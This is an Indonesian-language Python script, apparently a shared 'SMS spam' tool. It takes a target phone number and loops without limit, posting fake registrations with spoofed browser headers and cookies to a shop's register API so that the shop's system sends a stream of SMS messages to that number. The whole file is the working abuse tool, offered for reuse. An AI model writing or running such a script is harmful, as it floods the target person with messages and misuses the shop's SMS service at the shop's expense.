#IngatBossque
#Jangan Cuma Recode fahamin Kode Ini 
#Supaya lu bisa buat sendiri
#Belajar secara otodidak sangat berarti
import os,sys,time,requests,subprocess
from requests import post

def keluar():
    os.system("exit")
def bersih():
    os.system("clear")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./12)
def kembali():
    hi = input("Coba lagi? (y/t): ")
    if hi == "y":
       subprocess.call("python tokdis.py",shell=True)
    elif hi == "t":
         print ("Bye Tod!!")
         keluar()
    else:
         print("Tidak ada Input!!")
         subprocess.call("python tokdis.py",shell=True)

bersih()
banner = """
\033[1;96m____ ___  ____ _  _    ___ ____ _  _ ___  _ ____ 
[__  |__] |__| |\/|     |  |  | |_/  |  \ | [__  
___] |    |  | |  |     |  |__| | \_ |__/ | ___] 
\033[90m==============================================
\033[1;97mCoded\033[1;91m:\033[1;96mFahmiApz
\033[1;97mYoutube\033[1;91m:\033[1;96mApmzChannel
\033[1;97mGithub\033[1;91m:\033[1;92mhttps://github.com/BangDanz
\033[90m==============================================
"""
print (banner)
keluar()                                                              
print ("\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91mNote\033[1;97m:Spam Tidak Terbatas")
print ("\033[1;97m[\033[90mCtrl Z\033[1;97m] Untuk Berhenti!!")                       
print ("\033[90m==============================================")
no = input("\033[1;97m[\033[1;92mMasukan Nomor\033[1;97m]:\033[1;96m")
print ("\033[90m==============================================")
print ("\033[1;93mLoading")
kata("\033[1;91m[\033[1;97m>>>>>>>>>>>>>>>>>>>>>>>>>\033[1;91m]")
head = {"Host": "tokodistributor.com",
        "content-length": "108",
        "accept":" application/json, text/javascript, */*; q=0.01",
        "sec-fetch-dest": "empty",
        "x-requested-with":" XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        "dnt":" 1",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://tokodistributor.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "referer": "https://tokodistributor.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "cookie": "_ga=GA1.2.645156552.1586597797",
        "cookie": "_gid=GA1.2.1322422898.1586597797",
        "cookie": "_fbp=fb.1.1586597800739.607468356",
        "cookie": "tokdis=5nqlnir4mt62ljrso9rsovo8gdjfhq07",
        "cookie": "_gat_gtag_UA_112000517_1=1",
        }
params = {
"identification":no,
"email_address":"kanekikun@gmail.com",
"username":"rayadone32",
"password":"test12345",
"step":"1",
"fullname":"ahmad sabeq",
"handphone":no,
"headers": head,
}
try:
     while True:
            r = requests.post("https://tokodistributor.com/api-tokdis/v/register",params)
            if r:
                 time.sleep(0.60)
                 print ("\033[1;97m[\033[1;92mBerhasil\033[1;97m] Mengirim Sms Ke Nomor:\033[1;97m[\033[1;96m",no,"\033[1;97m]")
            else:
                 print ("\033[1;91mGagal")
                 kembali()
except KeyboardInterrupt:
        kembali()
